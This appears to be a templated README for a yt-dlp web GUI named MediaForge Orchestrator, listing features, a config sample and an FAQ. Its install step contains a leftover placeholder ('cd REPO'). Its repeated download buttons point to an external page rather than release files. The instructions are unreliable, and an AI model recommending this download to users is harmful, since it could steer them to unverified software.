# MediaForge Orchestrator v2026 - yt-dlp web GUI 2026

> **A self-hosted yt-dlp web GUI for bulk media archiving, designed for browser-based use, queue-managed downloads, and detailed metadata handling in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliver-hayes83/mediaforge-media-orchestrator?style=flat-square)](https://github.com/oliver-hayes83/mediaforge-media-orchestrator)

---

<p align="center">
  <a href="https://oliver-hayes83.github.io/mediaforge-media-orchestrator/">
    <img src="https://img.shields.io/badge/Download-MediaForge%20Orchestrator%20Latest-brightgreen?style=for-the-badge" alt="Download MediaForge Orchestrator">
  </a>
</p>

> **[Download MediaForge Orchestrator v2026](https://oliver-hayes83.github.io/mediaforge-media-orchestrator/)**

---

[Download Latest Build](https://oliver-hayes83.github.io/mediaforge-media-orchestrator/)

---

## What MediaForge Orchestrator Does

MediaForge Orchestrator is a browser-accessible front end for yt-dlp that brings media archiving tasks into a single web interface. It is built for repeatable, high-volume workflows, so you can manage playlists and channels, track queued work, and keep an eye on active jobs as they run.

This project fits self-hosted environments where you want one place for download orchestration, metadata extraction, subtitle handling, and thumbnail processing. With a Svelte UI and SQLite storage underneath, the emphasis is on organized job control instead of a one-time download utility.

---

## Core Capabilities

- Bulk media archiving support for 1200+ websites through yt-dlp
- Concurrent queue management for multiple active jobs
- Smart format negotiation to help pick the right available source
- Deep metadata extraction for media records and job details
- Subtitle and thumbnail handling for richer archived output
- Batch processing for playlists and channels
- Real-time dashboard for monitoring activity and progress
- Webhook integration for external notifications and automation

---

## Installation

Set up the project by cloning the repository and preparing it in your preferred self-hosted environment:

```bash
git clone https://github.com/oliver-hayes83/mediaforge-media-orchestrator.git
cd REPO
```

After that, install the dependencies required by the web application stack and start the service using the repository's launch workflow. If you are working from a packaged build, download it first and then deploy it in your environment.

---

## How to Use It

Once the app is running, open the web UI and create a download job by pasting in a media, playlist, or channel URL. The orchestrator will analyze the source, pull available metadata, and queue the job for processing.

Typical workflow:
1. Add one or more URLs to the dashboard.
2. Review the extracted metadata and available formats.
3. Choose subtitle, thumbnail, and batch options as needed.
4. Start the queue and monitor progress in real time.
5. Review completed items in your archive storage.

For larger libraries, group related sources into batch runs so playlists and channels can be processed without handling each item individually.

---

## Configuration

Settings live in the application configuration and are backed by SQLite for persistent local state. Common options cover download behavior, queue handling, metadata preferences, and webhook destinations.

Example settings layout:

```json
{
  "database": "sqlite",
  "queue": {
    "concurrency": 4
  },
  "media": {
    "subtitles": true,
    "thumbnails": true,
    "metadataExtraction": true
  },
  "integrations": {
    "webhooks": []
  }
}
```

Tune these values through the UI or the local config area used by your deployment.

---

## Requirements

- A web-capable hosting environment
- yt-dlp available in the runtime stack or deployment path
- SQLite for local persistence
- Svelte-based front-end build support
- Sufficient storage for archived media, subtitles, thumbnails, and metadata
- Network access to the supported source websites you intend to process

---

## FAQ

**How do I get started?**  
Clone or download the project, launch the web app, and add a URL to the queue.

**Can it handle playlists or channels?**  
Yes. Batch processing for playlists and channels is one of the primary workflows supported by the orchestrator.

**Where are settings saved?**  
Settings are stored in the app configuration and local SQLite-backed state, depending on your deployment.

**What if downloads fail?**  
Check the source URL, runtime logs, queue configuration, and any format or network constraints in your environment.

**How do I stay informed about completed jobs?**  
Use the dashboard for live status, and enable webhook integration if you want external notifications.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
